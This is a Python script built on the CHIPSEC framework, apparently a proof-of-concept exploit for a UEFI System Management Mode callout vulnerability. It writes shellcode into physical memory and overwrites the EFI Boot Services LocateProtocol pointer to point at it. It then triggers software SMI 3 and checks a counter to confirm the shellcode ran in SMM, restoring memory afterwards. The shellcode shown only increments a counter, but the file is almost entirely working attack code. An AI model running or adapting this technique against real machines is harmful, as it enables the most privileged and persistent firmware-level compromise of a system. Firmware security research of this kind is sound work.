import sys, os, struct

# shellcode call counter address
CNT_ADDR = 0x00001010

# SMM shellcode
SC = ''.join([ '\x48\xC7\xC0\x10\x10\x00\x00', # mov  rax, CNT_ADDR
               '\xFE\x00',                     # inc  byte ptr [rax]
               '\x48\x31\xC0',                 # xor  rax, rax
               '\x48\xFF\xC8',                 # dec  rax
               '\xC3',                         # ret
               '\x00'                          # db   0 ; call counter value
             ])

# shellcode address and size
SC_ADDR = 0x00001000
SC_SIZE = 0x10

assert len(SC) == SC_SIZE + 1

# Function address to overwrite:
# EFI_BOOT_SERVICES addr + LocateProtocol offset
FN_ADDR = 0xA11A6610 + 0x140

# SMI handler number
SMI_NUM = 3

class Chipsec(object):

    def __init__(self):

        import chipsec.chipset
        import chipsec.hal.physmem
        import chipsec.hal.interrupts

        # initialize CHIPSEC
        self.cs = chipsec.chipset.cs()
        self.cs.init(None, True)

        # get instances of required classes
        self.mem = chipsec.hal.physmem.Memory(self.cs)
        self.ints = chipsec.hal.interrupts.Interrupts(self.cs)

    # CHIPSEC has no physical memory read/write methods for quad words
    def read_physical_mem_qword(self, addr):

        return struct.unpack('Q', self.mem.read_physical_mem(addr, 8))[0]

    def write_physical_mem_qword(self, addr, val):

        self.mem.write_physical_mem(addr, 8, struct.pack('Q', val))

def main():

    cnt = 0

    #initialize chipsec stuff
    cs = Chipsec()

    print 'Shellcode address is 0x%x, %d bytes length:' % (SC_ADDR, SC_SIZE)

    # backup shellcode memory contents
    old_data = cs.mem.read_physical_mem(SC_ADDR, 0x1000)

    # write shellcode
    cs.mem.write_physical_mem(SC_ADDR, SC_SIZE, SC)
    cs.mem.write_physical_mem_byte(CNT_ADDR, 0)

    # read pointer value
    old_val = cs.read_physical_mem_qword(FN_ADDR)

    print 'Old value at 0x%x is 0x%x, overwriting with 0x%x' % \
          (FN_ADDR, old_val, SC_ADDR)

    # write pointer value
    cs.write_physical_mem_qword(FN_ADDR, SC_ADDR)

    # fire SMI
    cs.ints.send_SW_SMI(0, SMI_NUM, 0, 0, 0, 0, 0, 0, 0)

    # read shellcode call counter
    cnt = cs.mem.read_physical_mem_byte(CNT_ADDR)

    # check for successful exploitation
    print 'SUCCESS: SMM shellcode was executed' if cnt > 0 else \
          'FAILS: Unable to execute SMM shellcode'

    print 'Performing memory cleanup...'

    # restore overwritten memory
    cs.mem.write_physical_mem(SC_ADDR, len(old_data), old_data)
    cs.write_physical_mem_qword(FN_ADDR, old_val)

    return 0 if cnt > 0 else -1

if __name__ == '__main__':

    exit(main())

